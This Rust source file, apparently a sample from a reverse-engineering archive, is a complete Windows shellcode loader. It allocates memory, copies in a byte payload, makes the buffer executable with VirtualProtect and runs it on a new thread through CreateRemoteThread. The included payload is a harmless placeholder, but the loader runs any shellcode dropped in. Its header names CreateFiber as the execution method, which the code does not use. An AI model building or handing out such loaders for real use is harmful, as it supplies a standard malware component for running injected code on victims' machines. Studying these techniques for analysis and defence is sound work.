/*
    Shellcode Loader
    Archive of Reversing.ID

    Executing shellcode as new thread

Compile:
    $ cargo build

Technique:
    - allocation:   VirtualAlloc
    - writing:      copy()
    - permission:   VirtualProtect
    - execution:    CreateFiber
*/

use std::{mem, ptr};
use windows_sys::Win32::{
    Foundation::GetLastError,
    System::{
        Memory::{
            VirtualAlloc, VirtualFree, VirtualProtect, 
            MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, 
            PAGE_READWRITE, PAGE_EXECUTE_READ
        },
        Threading::{
            CreateRemoteThread, GetCurrentProcess,
            WaitForSingleObject,
            INFINITE, LPTHREAD_START_ROUTINE,
        },
    }
};

fn main() {
    // shellcode storage in stack
    let payload: [u8; 4] = [0x90, 0x90, 0xCC, 0xC3];
    let mut old_protect = PAGE_READWRITE;
    
    unsafe {
        // allocate memory buffer for payload as READ-WRITE (no executable)
        let runtime = VirtualAlloc(
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if runtime.is_null() {
            println!("[-] unable to allocate");
            return;
        }

        // copy payload to the buffer
        ptr::copy(payload.as_ptr(), runtime.cast(), payload.len());

        // make buffer executable (R-X)
        let retval = VirtualProtect (
            runtime,
            payload.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if retval != 0 {
            let ep: LPTHREAD_START_ROUTINE = mem::transmute(runtime);

            // run the shellcode on new thread
            let th_shellcode = 
                CreateRemoteThread (
                    GetCurrentProcess(), 
                    ptr::null_mut(), 
                    0, 
                    ep, 
                    ptr::null_mut(), 
                    0, 
                    ptr::null_mut()
                );

            // wait until thread exit gracefully, if not print the error
            if WaitForSingleObject(th_shellcode, INFINITE) != 0 {
                let error = GetLastError();
                println!("Error: {}", error.to_string());
            }
        }

        VirtualFree(runtime, payload.len(), MEM_RELEASE);
    }
}
